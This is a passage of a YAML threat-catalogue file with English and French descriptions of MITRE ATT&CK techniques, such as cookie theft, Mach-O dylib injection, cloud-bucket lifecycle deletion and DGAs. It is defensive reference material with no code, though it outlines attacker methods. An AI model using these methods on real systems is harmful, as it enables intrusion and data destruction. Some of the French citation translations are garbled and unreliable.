      \ Compromise](https://attack.mitre.org/techniques/T1189) or downloading and\
      \ executing these script files as secondary payloads. Since these payloads are\
      \ text-based, it is also very common for adversaries to obfuscate their content\
      \ as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\
      https://attack.mitre.org/techniques/T1059/007"
    translations:
      fr:
        name: JavaScript
        description: "Les adversaires peuvent abuser de diverses impl\xE9mentations\
          \ de JavaScript pour l'ex\xE9cution. JavaScript (JS) est un langage de script\
          \ ind\xE9pendant de la plateforme (compil\xE9 juste-\xE0-temps \xE0 l'ex\xE9\
          cution) couramment associ\xE9 aux scripts dans les pages web, bien que JS\
          \ puisse \xEAtre ex\xE9cut\xE9 dans des environnements d'ex\xE9cution hors\
          \ navigateur. (Citation : NodeJS)\n\nJScript est l'impl\xE9mentation Microsoft\
          \ de la m\xEAme norme de scripting. JScript est interpr\xE9t\xE9 via le\
          \ moteur Windows Script et est donc int\xE9gr\xE9 \xE0 de nombreux composants\
          \ de Windows, tels que les pages [Component Object Model](https://attack.mitre.org/techniques/T1559/001)\
          \ et Internet Explorer HTML Application (HTA). (Citation : JScrip mai 2018)(Citation\
          \ : Microsoft JScript 2007)(Citation : Microsoft Windows Scripts)\n\nJavaScript\
          \ pour l'automatisation (JXA) est un langage de script pour macOS bas\xE9\
          \ sur JavaScript, inclus dans le cadre de l'Open Scripting Architecture\
          \ (OSA) d'Apple, qui a \xE9t\xE9 introduit dans OSX 10.10. Le syst\xE8me\
          \ d'exploitation d'Apple offre des capacit\xE9s de script pour contr\xF4\
          ler les applications, interfacer avec le syst\xE8me d'exploitation et relier\
          \ l'acc\xE8s au reste des API internes d'Apple. Depuis OSX 10.10, OSA ne\
          \ prend en charge que deux langages, JXA et [AppleScript](https://attack.mitre.org/techniques/T1059/002).\
          \ Les scripts peuvent \xEAtre ex\xE9cut\xE9s via l'utilitaire en ligne de\
          \ commande <code>osascript</code>, ils peuvent \xEAtre compil\xE9s en applications\
          \ ou fichiers script via <code>osacompile</code>, et ils peuvent \xEAtre\
          \ compil\xE9s et ex\xE9cut\xE9s en m\xE9moire d'autres programmes en utilisant\
          \ le cadre OSAKit. (Citation : Apple About Mac Scripting 2016)(Citation\
          \ : SpecterOps JXA 2020)(Citation : \xC9quipe rouge SentinelOne macOS)(Citation\
          \ : Bruant argent\xE9 du Canari rouge f\xE9vrier 2021)(Citation : MDSec\
          \ macOS JXA et VSCode)\n\nLes adversaires peuvent abuser de diverses impl\xE9\
          mentations de JavaScript pour ex\xE9cuter diff\xE9rents comportements. Les\
          \ usages courants incluent l'h\xE9bergement de scripts malveillants sur\
          \ des sites web dans le cadre d'une [Compromission en drive-by](https://attack.mitre.org/techniques/T1189)\
          \ ou le t\xE9l\xE9chargement et l'ex\xE9cution de ces fichiers de script\
          \ en tant que charges utiles secondaires. Puisque ces charges utiles sont\
          \ bas\xE9es sur du texte, il est \xE9galement tr\xE8s courant que les adversaires\
          \ obscurcissent leur contenu dans le cadre de [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).https\_\
          ://attack.mitre.org/techniques/T1059/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.002
    ref_id: T1590.002
    name: DNS
    description: "Adversaries may gather information about the victim's DNS that can\
      \ be used during targeting. DNS information may include a variety of details,\
      \ including registered name servers as well as records that outline addressing\
      \ for a target\u2019s subdomains, mail servers, and other hosts. DNS MX, TXT,\
      \ and SPF records may also reveal the use of third party cloud and SaaS providers,\
      \ such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf\
      \ Twitter DNS Records)\n\nAdversaries may gather this information in various\
      \ ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001).\
      \ DNS information may also be exposed to adversaries via online or other accessible\
      \ data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:\
      \ DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may\
      \ reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical\
      \ Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593),\
      \ or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing\
      \ operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
      \ or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),\
      \ and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\
      \nAdversaries may also use DNS zone transfer (DNS query type AXFR) to collect\
      \ all records from a misconfigured DNS server.(Citation: Trails-DNS)(Citation:\
      \ DNS-CISA)(Citation: Alexa-dns)\nhttps://attack.mitre.org/techniques/T1590/002"
    translations:
      fr:
        name: DNS
        description: "Les adversaires peuvent recueillir des informations sur le DNS\
          \ de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage. Les informations\
          \ DNS peuvent inclure une vari\xE9t\xE9 de d\xE9tails, notamment des serveurs\
          \ de noms enregistr\xE9s ainsi que des enregistrements qui d\xE9taillent\
          \ l'adressage des sous-domaines, serveurs de messagerie et autres h\xF4\
          tes d'une cible. Les enregistrements DNS, MX, TXT et SPF peuvent \xE9galement\
          \ r\xE9v\xE9ler l'utilisation de fournisseurs tiers de cloud et SaaS, tels\
          \ qu'Office 365, G Suite, Salesforce ou Zendesk. (Citation : Sean Metcalf\
          \ Enregistrements DNS Twitter)\n\nLes adversaires peuvent recueillir ces\
          \ informations de diff\xE9rentes mani\xE8res, comme en interrogeant ou en\
          \ collectant des informations via [DNS/DNS passif](https://attack.mitre.org/techniques/T1596/001).\
          \ Les informations DNS peuvent \xE9galement \xEAtre expos\xE9es aux adversaires\
          \ via des ensembles de donn\xE9es en ligne ou autres donn\xE9es accessibles\
          \ (ex : [Recherche dans les bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)).\
          \ (Citation : Conteneur DNS)(Citation : DNS passif circulaire) La collecte\
          \ de ces informations peut r\xE9v\xE9ler d'autres formes de reconnaissance\
          \ (ex : [Recherche dans des bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596),\
          \ [Recherche dans des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593),\
          \ ou [Scan actif](https://attack.mitre.org/techniques/T1595)), l'\xE9tablissement\
          \ de ressources op\xE9rationnelles (ex : [Acquisition d'infrastructure](https://attack.mitre.org/techniques/T1583)\
          \ ou [Infrastructure compromise]( https://attack.mitre.org/techniques/T1584)),\
          \ et/ou acc\xE8s initial (ex : [Services externes \xE0 distance](https://attack.mitre.org/techniques/T1133)).\n\
          \nLes adversaires peuvent \xE9galement utiliser le transfert de zone DNS\
          \ (type de requ\xEAte DNS AXFR) pour collecter tous les enregistrements\
          \ d'un serveur DNS mal configur\xE9. (Citation : Trails-DNS)(Citation :\
          \ DNS-CISA)(Citation : Alexa-dns https://attack.mitre.org/techniques/T1590/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1485.001
    ref_id: T1485.001
    name: Lifecycle-Triggered Deletion
    description: "Adversaries may modify the lifecycle policies of a cloud storage\
      \ bucket to destroy all objects stored within.  \n\nCloud storage buckets often\
      \ allow users to set lifecycle policies to automate the migration, archival,\
      \ or deletion of objects after a set period of time.(Citation: AWS Storage Lifecycles)(Citation:\
      \ GCP Storage Lifecycles)(Citation: Azure Storage Lifecycles) If a threat actor\
      \ has sufficient permissions to modify these policies, they may be able to delete\
      \ all objects at once. \n\nFor example, in AWS environments, an adversary with\
      \ the `PutLifecycleConfiguration` permission may use the `PutBucketLifecycle`\
      \ API call to apply a lifecycle policy to an S3 bucket that deletes all objects\
      \ in the bucket after one day.(Citation: Palo Alto Cloud Ransomware)(Citation:\
      \ Halcyon AWS Ransomware 2025) In addition to destroying data for purposes of\
      \ extortion and [Financial Theft](https://attack.mitre.org/techniques/T1657),\
      \ adversaries may also perform this action on buckets storing cloud logs for\
      \ [Indicator Removal](https://attack.mitre.org/techniques/T1070).(Citation:\
      \ Datadog S3 Lifecycle CloudTrail Logs)\nhttps://attack.mitre.org/techniques/T1485/001"
    translations:
      fr:
        name: "Suppression d\xE9clench\xE9e par le cycle de vie"
        description: "Les adversaires peuvent modifier les politiques de cycle de\
          \ vie d'un seau de stockage cloud pour d\xE9truire tous les objets stock\xE9\
          s \xE0 l'int\xE9rieur.  \n\nLes buckets de stockage cloud permettent souvent\
          \ aux utilisateurs de d\xE9finir des politiques de cycle de vie pour automatiser\
          \ la migration, l'archivage ou la suppression des objets apr\xE8s une p\xE9\
          riode d\xE9termin\xE9e. Citation : AWS Storage Lifecycles)(Citation : GCP\
          \ Storage Lifecycles)(Citation : Azure Storage Lifecycles) Si un acteur\
          \ malveillant dispose de suffisamment d'autorisations pour modifier ces\
          \ politiques, il peut \xEAtre en mesure de supprimer tous les objets d'un\
          \ coup. \n\nPar exemple, dans les environnements AWS, un adversaire disposant\
          \ de la permission \xAB PutLifecycleConfiguration \xBB peut utiliser l'appel\
          \ API \xAB PutBucketLifecycle \xBB pour appliquer une politique de cycle\
          \ de vie \xE0 un compartiment S3 qui supprime tous les objets du compartiment\
          \ apr\xE8s un jour. ( Citation : Palo Alto Cloud Ransomware (Citation :\
          \ Halcyon AWS Ransomware 2025) En plus de d\xE9truire des donn\xE9es \xE0\
          \ des fins d'extorsion et de [vol financier](https://attack.mitre.org/techniques/T1657),\
          \ les adversaires peuvent \xE9galement effectuer cette action sur des buckets\
          \ stockant des journaux cloud pour [Suppression d'indicateurs](https://attack.mitre.org/techniques/T1070).\
          \ (Citation : Datadog S3 Lifecycle CloudTrail Logs) https://attack.mitre.org/techniques/T1485/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1123
    ref_id: T1123
    name: Audio Capture
    description: 'An adversary can leverage a computer''s peripheral devices (e.g.,
      microphones and webcams) or applications (e.g., voice and video call services)
      to capture audio recordings for the purpose of listening into sensitive conversations
      to gather information.(Citation: ESET Attor Oct 2019)


      Malware or scripts may be used to interact with the devices through an available
      API provided by the operating system or an application to capture audio. Audio
      files may be written to disk and exfiltrated later.

      https://attack.mitre.org/techniques/T1123'
    translations:
      fr:
        name: Audio Capture
        description: "Un adversaire peut exploiter les p\xE9riph\xE9riques d'un ordinateur\
          \ (par exemple, microphones et webcams) ou des applications (par exemple,\
          \ des services d'appels vocaux et vid\xE9o) pour capturer des enregistrements\
          \ audio dans le but d'\xE9couter des conversations sensibles afin de recueillir\
          \ des informations. (Citation : ESET Attor oct. 2019)\n\nDes logiciels malveillants\
          \ ou des scripts peuvent \xEAtre utilis\xE9s pour interagir avec les appareils\
          \ via une API disponible fournie par le syst\xE8me d'exploitation ou une\
          \ application pour capturer l'audio. Les fichiers audio peuvent \xEAtre\
          \ \xE9crits sur disque puis exfiltr\xE9s ult\xE9rieurement.https\_://attack.mitre.org/techniques/T1123"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543
    ref_id: T1543
    name: Create or Modify System Process
    description: "Adversaries may create or modify system-level processes to repeatedly\
      \ execute malicious payloads as part of persistence. When operating systems\
      \ boot up, they can start processes that perform background system functions.\
      \ On Windows and Linux, these system processes are referred to as services.(Citation:\
      \ TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)\
      \ and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run\
      \ to finish system initialization and load user specific parameters.(Citation:\
      \ AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services,\
      \ daemons, or agents that can be configured to execute at startup or a repeatable\
      \ interval in order to establish persistence. Similarly, adversaries may modify\
      \ existing services, daemons, or agents to achieve the same effect.  \n\nServices,\
      \ daemons, or agents may be created with administrator privileges but executed\
      \ under root/SYSTEM privileges. Adversaries may leverage this functionality\
      \ to create or modify system processes in order to escalate privileges.(Citation:\
      \ OSX Malware Detection)\nhttps://attack.mitre.org/techniques/T1543"
    translations:
      fr:
        name: "Cr\xE9er ou modifier un processus syst\xE8me"
        description: "Les adversaires peuvent cr\xE9er ou modifier des processus au\
          \ niveau syst\xE8me pour ex\xE9cuter \xE0 plusieurs reprises des charges\
          \ utiles malveillantes dans le cadre de la persistance. Lorsque les syst\xE8\
          mes d'exploitation d\xE9marrent, ils peuvent lancer des processus qui ex\xE9\
          cutent des fonctions syst\xE8me en arri\xE8re-plan. Sous Windows et Linux,\
          \ ces processus syst\xE8me sont appel\xE9s services. (Citation : TechNet\
          \ Services) Sur macOS, des processus lanc\xE9s appel\xE9s [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)\
          \ et [Launch Agent](https://attack.mitre.org/techniques/T1543/001) sont\
          \ ex\xE9cut\xE9s pour finaliser l'initialisation du syst\xE8me et charger\
          \ des param\xE8tres sp\xE9cifiques \xE0 l'utilisateur. (Citation : Agent\
          \ de lancement AppleDocs Daemons) \n\nLes adversaires peuvent installer\
          \ de nouveaux services, d\xE9mons ou agents qui peuvent \xEAtre configur\xE9\
          s pour s'ex\xE9cuter au d\xE9marrage ou \xE0 un intervalle r\xE9p\xE9table\
          \ afin d'\xE9tablir la persistance. De m\xEAme, les adversaires peuvent\
          \ modifier des services, d\xE9mons ou agents existants pour obtenir le m\xEA\
          me effet.  \n\nLes services, d\xE9mons ou agents peuvent \xEAtre cr\xE9\xE9\
          s avec des privil\xE8ges administrateur mais ex\xE9cut\xE9s sous des privil\xE8\
          ges root/SYSTEM. Les adversaires peuvent exploiter cette fonctionnalit\xE9\
          \ pour cr\xE9er ou modifier des processus syst\xE8me afin d'escalader les\
          \ privil\xE8ges. (Citation : D\xE9tection de logiciels malveillants OSX)https://attack.mitre.org/techniques/T1543"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1133
    ref_id: T1133
    name: External Remote Services
    description: "Adversaries may leverage external-facing remote services to initially\
      \ access and/or persist within a network. Remote services such as VPNs, Citrix,\
      \ and other access mechanisms allow users to connect to internal enterprise\
      \ network resources from external locations. There are often remote service\
      \ gateways that manage connections and credential authentication for these services.\
      \ Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006)\
      \ and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used\
      \ externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to\
      \ [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service\
      \ is often a requirement, which could be obtained through credential pharming\
      \ or by obtaining the credentials from users after compromising the enterprise\
      \ network.(Citation: Volexity Virtual Private Keylogging) Access to remote services\
      \ may be used as a redundant or persistent access mechanism during an operation.\n\
      \nAccess may also be gained through an exposed service that doesn\u2019t require\
      \ authentication. In containerized environments, this may include an exposed\
      \ Docker API, Kubernetes API server, kubelet, or web application such as the\
      \ Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation:\
      \ Unit 42 Hildegard Malware)\n\nAdversaries may also establish persistence on\
      \ network by configuring a Tor hidden service on a compromised system. Adversaries\
      \ may utilize the tool `ShadowLink` to facilitate the installation and configuration\
      \ of the Tor hidden service. Tor hidden service is then accessible via the Tor\
      \ network because `ShadowLink` sets up a .onion address on the compromised system.\
      \ `ShadowLink` may be used to forward any inbound connections to RDP, allowing\
      \ the adversaries to have remote access.(Citation: The BadPilot campaign) Adversaries\
      \ may get `ShadowLink` to persist on a system by masquerading it as an MS Defender\
      \ application.(Citation: Russian threat actors dig in, prepare to seize on war\
      \ fatigue)\nhttps://attack.mitre.org/techniques/T1133"
    translations:
      fr:
        name: "Services externes \xE0 distance"
        description: "Les adversaires peuvent exploiter des services \xE0 distance\
          \ externes pour acc\xE9der initialement et/ou persister au sein d'un r\xE9\
          seau. Les services distants tels que les VPN, Citrix et autres m\xE9canismes\
          \ d'acc\xE8s permettent aux utilisateurs de se connecter aux ressources\
          \ r\xE9seau internes de l'entreprise depuis des emplacements externes. Il\
          \ existe souvent des passerelles de service distantes qui g\xE8rent les\
          \ connexions et l'authentification des identifiants pour ces services. Des\
          \ services tels que [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006)\
          \ et [VNC](https://attack.mitre.org/techniques/T1021/005) peuvent \xE9galement\
          \ \xEAtre utilis\xE9s en externe. (Citation : Logiciel VNC MacOS pour bureau\
          \ \xE0 distance)\n\nL'acc\xE8s aux [comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour utiliser le service est souvent une exigence, qui peut \xEAtre obtenue\
          \ par le phramming des identifiants ou en obtenant les identifiants des\
          \ utilisateurs apr\xE8s avoir compromis le r\xE9seau d'entreprise. (Citation\
          \ : Keylogging priv\xE9 virtuel Volexity) L'acc\xE8s aux services \xE0 distance\
          \ peut \xEAtre utilis\xE9 comme un m\xE9canisme d'acc\xE8s redondant ou\
          \ persistant pendant une op\xE9ration.\n\nL'acc\xE8s peut \xE9galement \xEA\
          tre obtenu via un service expos\xE9 qui ne n\xE9cessite pas d'authentification.\
          \ Dans les environnements conteneuris\xE9s, cela peut inclure une API Docker\
          \ expos\xE9e, un serveur API Kubernetes, un kubelet ou une application web\
          \ telle que le tableau de bord Kubernetes. (Citation : Serveur Docker Expos\xE9\
          \ de Trend Micro)(Citation : Unit\xE9 42 Malware Hildegard)\n\nLes adversaires\
          \ peuvent \xE9galement \xE9tablir la persistance sur le r\xE9seau en configurant\
          \ un service cach\xE9 Tor sur un syst\xE8me compromis. Les adversaires peuvent\
          \ utiliser l'outil \xAB ShadowLink \xBB pour faciliter l'installation et\
          \ la configuration du service cach\xE9 Tor. Le service cach\xE9 Tor est\
          \ alors accessible via le r\xE9seau Tor car \xAB ShadowLink \xBB configure\
          \ une adresse .onion sur le syst\xE8me compromis. \xAB ShadowLink \xBB peut\
          \ \xEAtre utilis\xE9 pour transmettre toute connexion entrante vers RDP,\
          \ permettant ainsi aux adversaires d'avoir un acc\xE8s \xE0 distance. (Citation\
          \ : La campagne BadPilot) Les adversaires peuvent faire persister \xAB ShadowLink\
          \ \xBB sur un syst\xE8me en le faisant passer pour une application MS Defender.\
          \ (Citation : Les acteurs de menace russes s'installent, se pr\xE9parent\
          \ \xE0 saisir la fatigue de guerre)https://attack.mitre.org/techniques/T1133"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.006
    ref_id: T1546.006
    name: LC_LOAD_DYLIB Addition
    description: "Adversaries may establish persistence by executing malicious content\
      \ triggered by the execution of tainted binaries. Mach-O binaries have a series\
      \ of headers that are used to perform certain operations when a binary is loaded.\
      \ The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic\
      \ libraries (dylibs) to load during execution time. These can be added ad-hoc\
      \ to the compiled binary as long as adjustments are made to the rest of the\
      \ fields and dependencies.(Citation: Writing Bad Malware for OSX) There are\
      \ tools available to perform these changes.\n\nAdversaries may modify Mach-O\
      \ binary headers to load and execute malicious dylibs every time the binary\
      \ is executed. Although any changes will invalidate digital signatures on binaries\
      \ because the binary is being modified, this can be remediated by simply removing\
      \ the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019\
      t checked at load time.(Citation: Malware Persistence on OS X)\nhttps://attack.mitre.org/techniques/T1546/006"
    translations:
      fr:
        name: LC_LOAD_DYLIB Ajout
        description: "Les adversaires peuvent \xE9tablir leur persistance en ex\xE9\
          cutant du contenu malveillant d\xE9clench\xE9 par l'ex\xE9cution de binaires\
          \ corrompus. Les binaires Mach-O poss\xE8dent une s\xE9rie d'en-t\xEAtes\
          \ utilis\xE9s pour effectuer certaines op\xE9rations lors du chargement\
          \ d'un binaire. L'en-t\xEAte LC_LOAD_DYLIB dans un binaire Mach-O indique\
          \ \xE0 macOS et OS X quelles biblioth\xE8ques dynamiques (dylibs) doivent\
          \ se charger pendant le temps d'ex\xE9cution. Celles-ci peuvent \xEAtre\
          \ ajout\xE9es ad hoc au binaire compil\xE9 \xE0 condition que des ajustements\
          \ soient apport\xE9s au reste des champs et d\xE9pendances. (Citation :\
          \ \xC9crire de mauvais malwares pour OSX) Il existe des outils pour effectuer\
          \ ces changements.\n\nLes adversaires peuvent modifier les en-t\xEAtes binaires\
          \ Mach-O pour charger et ex\xE9cuter des dylibs malveillants \xE0 chaque\
          \ ex\xE9cution du binaire. Bien que tout changement invalide les signatures\
          \ num\xE9riques sur les binaires car le binaire est modifi\xE9, cela peut\
          \ \xEAtre corrig\xE9 en supprimant simplement la commande LC_CODE_SIGNATURE\
          \ du binaire afin que la signature ne soit pas v\xE9rifi\xE9e au moment\
          \ du chargement. (Citation : Persistance des malwares sur OS X) https://attack.mitre.org/techniques/T1546/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1539
    ref_id: T1539
    name: Steal Web Session Cookie
    description: 'An adversary may steal web application or service session cookies
      and use them to gain access to web applications or Internet services as an authenticated
      user without needing credentials. Web applications and services often use session
      cookies as an authentication token after a user has authenticated to a website.


      Cookies are often valid for an extended period of time, even if the web application
      is not actively used. Cookies can be found on disk, in the process memory of
      the browser, and in network traffic to remote systems. Additionally, other applications
      on the targets machine might store sensitive authentication cookies in memory
      (e.g. apps which authenticate to cloud services). Session cookies can be used
      to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)


      There are several examples of malware targeting cookies from web browsers on
      the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42
      Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting
      malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204)
      by tricking victims into running malicious JavaScript in their browser.(Citation:
      Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)


      There are also open source frameworks such as `Evilginx2` and `Muraena` that
      can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557))
      that can be set up by an adversary and used in phishing campaigns.(Citation:
      Github evilginx2)(Citation: GitHub Mauraena)


      After an adversary acquires a valid cookie, they can then perform a [Web Session
      Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to
      the corresponding web application.

      https://attack.mitre.org/techniques/T1539'
    translations:
      fr:
        name: Voler le cookie de session web
        description: "Un adversaire peut voler des cookies d'applications web ou de\
          \ sessions de service et les utiliser pour acc\xE9der \xE0 des applications\
          \ web ou des services Internet en tant qu'utilisateur authentifi\xE9 sans\
          \ avoir besoin d'identifiants. Les applications et services web utilisent\
          \ souvent des cookies de session comme jeton d'authentification apr\xE8\
          s qu'un utilisateur s'est authentifi\xE9 sur un site web.\n\nLes cookies\
          \ sont souvent valides pendant une longue p\xE9riode, m\xEAme si l'application\
          \ web n'est pas activement utilis\xE9e. Les cookies se trouvent sur le disque,\
          \ dans la m\xE9moire des processus du navigateur, et dans le trafic r\xE9\
          seau vers les syst\xE8mes distants. De plus, d'autres applications sur la\
          \ machine cible peuvent stocker des cookies d'authentification sensibles\
          \ en m\xE9moire (par exemple, des applications qui s'authentifient sur des\
          \ services cloud). Les cookies de session peuvent \xEAtre utilis\xE9s pour\
          \ contourner certains protocoles d'authentification multi-facteurs. (Citation\
          \ : Passe le biscuit)\n\nIl existe plusieurs exemples de malwares ciblant\
          \ les cookies depuis des navigateurs web sur le syst\xE8me local. (Citation\
          \ : Kaspersky TajMahal avril 2019)(Citation : Cookies crypto Mac Unit 42\
          \ janvier 2019) Les adversaires peuvent aussi voler des cookies en injectant\
          \ du contenu JavaScript malveillant dans des sites web ou en s'appuyant\
          \ sur [User Execution](https://attack.mitre.org/techniques/T1204) en trompant\
          \ les victimes pour qu'elles ex\xE9cutent du JavaScript malveillant dans\
          \ leur navigateur. (Citation : Arnaque Talos Roblox 2023)(Citation : Favoris\
          \ Discord Krebs 2023)\n\nIl existe \xE9galement des frameworks open source\
          \ tels que \xAB Evilginx2 \xBB et \xAB Muraena \xBB qui peuvent collecter\
          \ les cookies de session via un proxy malveillant (par exemple, [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557))\
          \ qui peut \xEAtre configur\xE9 par un adversaire et utilis\xE9 dans des\
          \ campagnes de phishing. (Citation : Github evilginx2)(Citation : GitHub\
          \ Mauraena)\n\nApr\xE8s qu'un adversaire ait acquis un cookie valide, il\
          \ peut alors effectuer une technique de [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)\
          \ pour se connecter \xE0 l'application web correspondante.https\_://attack.mitre.org/techniques/T1539"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.007
    ref_id: T1053.007
    name: Container Orchestration Job
    description: 'Adversaries may abuse task scheduling functionality provided by
      container orchestration tools such as Kubernetes to schedule deployment of containers
      configured to execute malicious code. Container orchestration jobs run these
      automated tasks at a specific date and time, similar to cron jobs on a Linux
      system. Deployments of this type can also be configured to maintain a quantity
      of containers over time, automating the process of maintaining persistence within
      a cluster.


      In Kubernetes, a CronJob may be used to schedule a Job that runs one or more
      containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes
      CronJob) An adversary therefore may utilize a CronJob to schedule deployment
      of a Job that executes malicious code in various nodes within a cluster.(Citation:
      Threat Matrix for Kubernetes)

      https://attack.mitre.org/techniques/T1053/007'
    translations:
      fr:
        name: Travail d'orchestration de conteneurs
        description: "Les adversaires peuvent abuser des fonctionnalit\xE9s de planification\
          \ des t\xE2ches fournies par des outils d'orchestration de conteneurs tels\
          \ que Kubernetes pour planifier le d\xE9ploiement de conteneurs configur\xE9\
          s pour ex\xE9cuter du code malveillant. Les t\xE2ches d'orchestration de\
          \ conteneurs ex\xE9cutent ces t\xE2ches automatis\xE9es \xE0 une date et\
          \ une heure pr\xE9cises, de mani\xE8re similaire aux t\xE2ches cron sur\
          \ un syst\xE8me Linux. Les d\xE9ploiements de ce type peuvent \xE9galement\
          \ \xEAtre configur\xE9s pour maintenir un certain nombre de conteneurs dans\
          \ le temps, automatisant ainsi le processus de maintien de la persistance\
          \ au sein d'un cluster.\n\nDans Kubernetes, un CronJob peut \xEAtre utilis\xE9\
          \ pour planifier un Job qui ex\xE9cute un ou plusieurs conteneurs pour effectuer\
          \ des t\xE2ches sp\xE9cifiques. (Citation : Kubernetes Jobs)(Citation :\
          \ Kubernetes CronJob) Un adversaire peut donc utiliser un CronJob pour planifier\
          \ le d\xE9ploiement d'un Job ex\xE9cutant du code malveillant dans divers\
          \ n\u0153uds d'un cluster. (Citation : Matrice de menaces pour Kubernetes)\
          \ https://attack.mitre.org/techniques/T1053/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1568.002
    ref_id: T1568.002
    name: Domain Generation Algorithms
    description: "Adversaries may make use of Domain Generation Algorithms (DGAs)\
      \ to dynamically identify a destination domain for command and control traffic\
      \ rather than relying on a list of static IP addresses or domains. This has\
      \ the advantage of making it much harder for defenders to block, track, or take\
      \ over the command and control channel, as there potentially could be thousands\
      \ of domains that malware can check for instructions.(Citation: Cybereason Dissecting\
      \ DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs\
      \ can take the form of apparently random or \u201Cgibberish\u201D strings (ex:\
      \ istgmxdejdnxuyla.ru) when they construct domain names by generating each letter.\
      \ Alternatively, some DGAs employ whole words as the unit by concatenating words\
      \ together instead of letters (ex: cityjulydish.net). Many DGAs are time-based,\
      \ generating a different domain for each time period (hourly, daily, monthly,\
      \ etc). Others incorporate a seed value as well to make predicting future domains\
      \ more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation:\
      \ Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\
      \nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008).\
      \ When contact is lost with the primary command and control server malware may\
      \ employ a DGA as a means to reestablishing command and control.(Citation: Talos\
      \ CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit\
      \ 2017 Activity)\nhttps://attack.mitre.org/techniques/T1568/002"
    translations:
      fr:
        name: "Algorithmes de g\xE9n\xE9ration de domaines"
        description: "Les adversaires peuvent utiliser des algorithmes de g\xE9n\xE9\
          ration de domaines (DGA) pour identifier dynamiquement un domaine de destination\
          \ pour le trafic de commande et de contr\xF4le, plut\xF4t que de se fier\
          \ \xE0 une liste d'adresses IP ou de domaines statiques. Cela a l'avantage\
          \ de rendre beaucoup plus difficile pour les d\xE9fenseurs de bloquer, de\
          \ suivre ou de prendre le contr\xF4le du canal de commandement et de contr\xF4\
          le, car il pourrait potentiellement exister des milliers de domaines que\
          \ les malwares peuvent v\xE9rifier pour les instructions. (Citation : Cybereason\
          \ diss\xE9quant les DGA)(Citation : Cisco Umbrella DGA)(Citation : Unit\xE9\
          \ 42 DGA f\xE9vrier 2019)\n\nLes DGA peuvent prendre la forme de cha\xEE\
          nes apparemment al\xE9atoires ou \xAB charabia \xBB (ex : istgmxdejdnxuyla.ru)\
          \ lorsqu'elles construisent des noms de domaine en g\xE9n\xE9rant chaque\
          \ lettre. Alternativement, certaines DGA utilisent des mots entiers comme\
          \ unit\xE9 en concat\xE9nant des mots au lieu de lettres (ex : cityjulydish.net).\
          \ Beaucoup de DGA sont bas\xE9s sur le temps, g\xE9n\xE9rant un domaine\
          \ diff\xE9rent pour chaque p\xE9riode (horaire, journalier, mensuel, etc.).\
          \ D'autres int\xE8grent \xE9galement une valeur de d\xE9part pour rendre\
          \ la pr\xE9vision des domaines futurs plus difficile pour les d\xE9fenseurs.\
          \ (Citation : Cybereason diss\xE9quant les DGA)(Citation : Cisco Umbrella\
          \ DGA)(Citation : Talos CCleanup 2017)(Citation : Att\xE9nuation DGA d'Akamai)\n\
          \nLes adversaires peuvent utiliser les DGA \xE0 des fins de [Canaux de secours](https://attack.mitre.org/techniques/T1008).\
          \ Lorsque le contact avec le serveur principal de commande et de contr\xF4\
          le est perdu, un malware peut utiliser une DGA comme moyen de r\xE9tablir\
          \ le commandement et le contr\xF4le. (Citation : Talos CCleanup 2017)(Citation\
